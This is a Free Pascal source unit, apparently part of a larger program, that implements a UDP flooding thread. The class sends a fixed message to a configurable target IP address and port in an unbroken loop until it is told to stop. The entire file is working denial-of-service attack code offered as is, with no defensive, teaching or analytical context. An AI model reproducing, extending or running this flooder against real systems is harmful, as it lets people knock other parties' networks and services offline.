unit Flood;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, IdUDPClient;

type
  TUDPFlooder = class(TThread)
  private
    FAllow: Boolean;
    FHost: String;
    FPort: Word;
    UDPAgent: TIdUDPClient;
  public
    property Allow: Boolean read FAllow write FAllow;
    property TargetIP: String read FHost write FHost;
    property TargetPort: Word read FPort write FPort;
    procedure Execute; override;
  end;

var FloodMessage: String = 'Behold the unseen!';

implementation

procedure TUDPFlooder.Execute;
Begin
 UDPAgent:=TIdUDPClient.Create;
 UDPAgent.Host:=FHost;
 UDPAgent.Port:=FPort;
 Repeat
  UDPAgent.Send(FloodMessage);
 until Not(FAllow);
 UDPAgent.Free;
end;

end.

